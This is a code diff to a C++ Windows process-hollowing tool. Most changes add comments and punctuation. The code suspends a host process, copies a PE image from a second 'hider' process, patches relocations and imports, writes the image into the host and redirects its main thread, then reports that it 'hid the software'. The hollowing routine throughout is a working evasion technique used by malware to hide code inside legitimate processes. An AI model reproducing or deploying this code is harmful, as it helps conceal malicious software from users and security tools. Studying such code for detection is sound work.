@@ -4,22 +4,21 @@
 #include <Windows.h>
 #include <TlHelp32.h>
 
-//TODO: Use 64 bit by default, but when its finished, later use #ifndef macros etc to make it also work for 32bit.
-
 namespace process {
 
     // Typedefs
+
+    // Used in function casting with ntdll functions.
     typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
     typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
-
     typedef NTSTATUS(NTAPI* pNtSuspendProcess)(HANDLE ProcessHandle);
     typedef NTSTATUS(NTAPI* pNtResumeProcess)(HANDLE ProcessHandle);
 
     // Structs
 
     // Compacted PBI struct as we only want PebBaseAddress.
-    // Official struct also contains useful things such as NTSTATUS ExitStatus in place of Reserved1,
-    //                                                  or KPRIORITY BasePriority for Reserved2[1]
+    // Full struct also contains useful things such as NTSTATUS ExitStatus in place of Reserved1,
+    //                                              or KPRIORITY BasePriority for Reserved2[1].
     typedef struct _PROCESS_BASIC_INFORMATION {
         PVOID Reserved1;
         PVOID PebBaseAddress;
@@ -37,7 +36,7 @@ namespace process {
     };
     using unique_handle = std::unique_ptr<std::remove_pointer<HANDLE>::type, HandleCloser>;
 
-    // Forward declaration of needed function
+    // Forward declaration of a needed function.
     LPVOID get_process_base_address(HANDLE process_handle);
 
     // Get the process id of a process of name process_name.
@@ -54,7 +53,7 @@ namespace process {
         PROCESSENTRY32W entry;
         entry.dwSize = sizeof(decltype(entry));
 
-        if (Process32FirstW(snap_shot, &entry) == TRUE) // First process in snapshot
+        if (Process32FirstW(snap_shot, &entry) == TRUE) // First process in snapshot.
         {
             // Iterate all processes in the snapshot.
             do
@@ -65,9 +64,10 @@ namespace process {
                     process_id = entry.th32ProcessID;
                     break;
                 }
-            } while (Process32NextW(snap_shot, &entry) == TRUE);
+            } while (Process32NextW(snap_shot, &entry) == TRUE); // Continue the loop whilst criteria not met.
         }
 
+        // Close the handle before exiting.
         CloseHandle(snap_shot);
         return process_id;
     }
@@ -112,6 +112,7 @@ namespace process {
         return resume_status == 0;
     }
 
+    // Unmap process memory function.
     bool unmap_process_memory(HANDLE process_handle)
     {
         // Get ntdll
@@ -130,6 +131,7 @@ namespace process {
         return unmap_status == 0;
     }
 
+    // Allocate memory remotely.
     LPVOID allocate_remote_memory(HANDLE process_handle, SIZE_T size, DWORD protect)
     {
         return VirtualAllocEx(process_handle, NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
@@ -145,18 +147,18 @@ namespace process {
 
     LPVOID get_process_base_address(HANDLE process_handle)
     {
-        // Get ntdll
+        // Get ntdll.
         HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
         if (!ntdll) return nullptr;
 
-        // Get function NtQueryInformation from ntdll
+        // Get function NtQueryInformation from ntdll.
         pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
         if (!NtQueryInformationProcess) return nullptr;
 
-        // Declare a struct to hold the data from NtQueryInformationProcess
+        // Declare a struct to hold the data from NtQueryInformationProcess.
         PROCESS_BASIC_INFORMATION pbi{};
 
-        // Populate the PROCESS_BASIC_INFORMATION "pbi" struct
+        // Populate the PROCESS_BASIC_INFORMATION "pbi" struct.
         NTSTATUS query_status = NtQueryInformationProcess(process_handle, 0, &pbi, sizeof(pbi), NULL);
         if (query_status != 0) return nullptr;
 
@@ -189,7 +191,7 @@ namespace process {
 
         IMAGE_NT_HEADERS nt_headers;
 
-        // Grab NT Headers from the offset lp_base_address + dos_header.e_lfanew
+        // Grab NT Headers from the offset lp_base_address + dos_header.e_lfanew.
         read_success = ReadProcessMemory(
             process_handle,
             (BYTE*)lp_base_address + dos_header.e_lfanew,
@@ -200,15 +202,15 @@ namespace process {
 
         if (!read_success || nt_headers.Signature != IMAGE_NT_SIGNATURE) return false;
 
-        // SizeOfImage is the full size of the PE, including all sections
+        // SizeOfImage is the full size of the PE, including all sections.
         DWORD size_of_image = nt_headers.OptionalHeader.SizeOfImage;
 
         if (size_of_image == 0) return false;
 
-        // Resize the buffer to fit the bytes in the size of the image
+        // Resize the buffer to fit the bytes in the size of the image.
         buffer.resize(size_of_image);
 
-        // Read the PE image into the buffer
+        // Read the PE image into the buffer.
         read_success = ReadProcessMemory(
             process_handle,
             lp_base_address,
@@ -220,6 +222,7 @@ namespace process {
         return read_success;
     }
 
+    // Helper to get NT headers using a LPV base address.
     PIMAGE_NT_HEADERS get_nt_headers(LPVOID address)
     {
         PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(address);
@@ -258,32 +261,37 @@ namespace process {
         return true;
     }
 
+    // Patches all addresses in the pe_buffer so they match base_address blocks.
     bool fix_relocations(LPVOID base_address, LPVOID pe_buffer)
     {
         PIMAGE_NT_HEADERS nt_headers = get_nt_headers(pe_buffer);
         if (!nt_headers) return false;
 
+        // Delta contains the difference between the two addresses, from base_address and pe_buffer.
         ULONGLONG delta = (ULONGLONG)base_address - nt_headers->OptionalHeader.ImageBase;
-        if (delta == 0) return true;
+        if (delta == 0) return true; // Everything matches, no relocations needed.
 
         IMAGE_DATA_DIRECTORY reloc_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-        if (reloc_dir.Size == 0) return true;
+        if (reloc_dir.Size == 0) return true; // No relocation table, PE has no fixups.
 
+        // Loop for all blocks, each block is 4KB, and contains a list of offsets within the page to patch.
         for (
-            PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)((BYTE*)pe_buffer + reloc_dir.VirtualAddress);
-            (BYTE*)block < (BYTE*)pe_buffer + reloc_dir.VirtualAddress + reloc_dir.Size && block->SizeOfBlock > 0;
-            block = (PIMAGE_BASE_RELOCATION)((BYTE*)block + block->SizeOfBlock)
+            PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)((BYTE*)pe_buffer + reloc_dir.VirtualAddress); // Start
+            (BYTE*)block < (BYTE*)pe_buffer + reloc_dir.VirtualAddress + reloc_dir.Size && block->SizeOfBlock > 0; // End Condition
+            block = (PIMAGE_BASE_RELOCATION)((BYTE*)block + block->SizeOfBlock) // Incrementor
             ) {
 
+            // Inner loop for all sections within the block.
             DWORD num_entries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
             for (DWORD i{}; i < num_entries; i++)
             {
                 WORD entry = ((WORD*)(block + 1))[i];
-                WORD type = entry >> 12;
-                WORD offset = entry & 0xFFF;
+                WORD type = entry >> 12; // Upper 4 bits contain reloaction type.
+                WORD offset = entry & 0xFFF; // Lower 12 bits are the offset contained in the page.
 
-                if (type != IMAGE_REL_BASED_DIR64) continue;
+                if (type != IMAGE_REL_BASED_DIR64) continue; // Only fix 64bit absolute addresses.
 
+                // Add delta to the absolute address of this location in the local buffer.
                 ULONGLONG* patch = (ULONGLONG*)((BYTE*)pe_buffer + block->VirtualAddress + offset);
                 *patch += delta;
             }
@@ -292,14 +300,20 @@ namespace process {
         return true;
     }
 
+    // Fix imports of pe_buffer, by importing missing DLLs and function addresses.
+    // The IAT in the copyd PEI still contains addresses from the original process,
+    //      so we must resolve each imported function and
+    //      write the correct addr into the buffer before it gets written to the remote process.
     bool fix_imports(LPVOID pe_buffer)
     {
         PIMAGE_NT_HEADERS nt_headers = get_nt_headers(pe_buffer);
         if (!nt_headers) return false;
 
+        // Try to grab the import directory.
         IMAGE_DATA_DIRECTORY import_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
         if (import_dir.Size == 0) return true; // No imports
 
+        // Each description representes one imported DLL.
         PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pe_buffer + import_dir.VirtualAddress);
 
         // Iterate for each imported DLL
@@ -307,6 +321,7 @@ namespace process {
         {
             const char* dll_name = (const char*)((BYTE*)pe_buffer + import_desc->Name);
 
+            // Load the DLL here so we can resolve function addresses from it.
             HMODULE dll = LoadLibraryA(dll_name);
             if (!dll)
             {
@@ -315,7 +330,10 @@ namespace process {
                 continue; // Skip this DLL
             }
 
+            // FirstThunk is the IAT, which is what we overwrite with resolved addresses.
             PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)pe_buffer + import_desc->FirstThunk);
+
+            // OriginalFirstThunk is the INT, which is used to look up the function names.
             PIMAGE_THUNK_DATA orig_thunk = import_desc->OriginalFirstThunk
                 ? (PIMAGE_THUNK_DATA)((BYTE*)pe_buffer + import_desc->OriginalFirstThunk)
                 : thunk;
@@ -326,10 +344,12 @@ namespace process {
 
                 if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal))
                 {
+                    // Import using ordinal
                     func_addr = GetProcAddress(dll, MAKEINTRESOURCEA(IMAGE_ORDINAL(orig_thunk->u1.Ordinal)));
                 }
                 else
                 {
+                    // Import using name
                     PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pe_buffer + orig_thunk->u1.AddressOfData);
                     func_addr = GetProcAddress(dll, import_by_name->Name);
                 }
@@ -342,7 +362,7 @@ namespace process {
                     continue;
                 }
 
-                // Write resolved address into the IAT in the local buffer
+                // Write resolved address into the IAT in the buffer
                 thunk->u1.Function = (ULONGLONG)func_addr;
 
                 thunk++;
@@ -355,9 +375,10 @@ namespace process {
         return true;
     }
 
+    // Function helper to set the thread context of a thread to an entry point.
     bool set_thread_context(HANDLE thread, LPVOID entry_point)
     {
-        if (SuspendThread(thread) == (DWORD)-1)  // Suspend to re-set target context
+        if (SuspendThread(thread) == (DWORD)-1)  // Suspend to re-set target context.
             return false;
 
         // Create and set the context flags.
@@ -385,14 +406,15 @@ namespace process {
         return true;
     }
 
-    HANDLE get_main_thread(DWORD pid)
+    // Returns the main thread as a handle from a process id.
+    HANDLE get_main_thread(DWORD process_id)
     {
         HANDLE thread_handle = NULL;
 
-        unique_handle snap_shot(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)); // Snapshot all running threads in the system
+        unique_handle snap_shot(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)); // Snapshot all running threads in the system.
         if (snap_shot.get() == INVALID_HANDLE_VALUE) return nullptr;
 
-        // Initialize a THREADENTRY32 struct to hold the needed values
+        // Initialize a THREADENTRY32 struct to hold the needed values´.
         THREADENTRY32 thread_entry = {};
         thread_entry.dwSize = sizeof(THREADENTRY32);
 
@@ -400,8 +422,8 @@ namespace process {
 
         do
         {
-            // Skip threads that don't belong to the target process
-            if (thread_entry.th32OwnerProcessID != pid) continue;
+            // Skip threads that don't belong to the target process.
+            if (thread_entry.th32OwnerProcessID != process_id) continue;
 
             // Open the first thread with the rights we need for the rest of the software.
             //      the first thread typically is the main thread.
@@ -435,7 +457,7 @@ namespace process {
 
         if (host_handle == NULL || hider_handle == NULL) return false;
 
-        // Suspend the process so we can modify it's internal contents
+        // Suspend the process so we can modify it's internal contents.
         if (!suspend_process(host_handle))
             goto cleanup;
 
@@ -444,13 +466,13 @@ namespace process {
         suspended = true;
         hider_process_base = get_process_base_address(hider_handle);
 
-        // Read the portable executable's contents from the process hider_handle into portable_executable_buffer
+        // Read the portable executable's contents from the process hider_handle into portable_executable_buffer.
         if (!read_pe_from_process(hider_handle, hider_process_base, portable_executable_buffer))
             goto cleanup;
 
         std::cout << "[+] Read the executables' content from the hider.\n";
 
-        // Get the nt headers using the PE buffer's data
+        // Get the nt headers using the PE buffer's data.
         nt_headers = get_nt_headers(portable_executable_buffer.data());
         if (!nt_headers)
             goto cleanup;
@@ -490,7 +512,7 @@ namespace process {
         if (host_thread == NULL)
             goto cleanup;
 
-        // Set the main thread context of host_thread
+        // Set the main thread context of host_thread.
         if (!set_thread_context(host_thread, (BYTE*)remote_allocated_memory + nt_headers->OptionalHeader.AddressOfEntryPoint))
             goto cleanup;
 
@@ -504,6 +526,7 @@ namespace process {
         suspended = false;
         success = true;
 
+    // Used with goto cleanup to close any open handles, and log output.
     cleanup:
         if (!success)
         {
@@ -515,6 +538,7 @@ namespace process {
             std::cout << "[+] Successfully hollowed the process, and hid the software!\n" << std::flush;
             std::cin.get();
         }
+        // Close handles and finalize cleanup before exiting.
         if (suspended && !success) resume_process(host_handle);
         if (host_handle) CloseHandle(host_handle);
         if (hider_handle) CloseHandle(hider_handle);
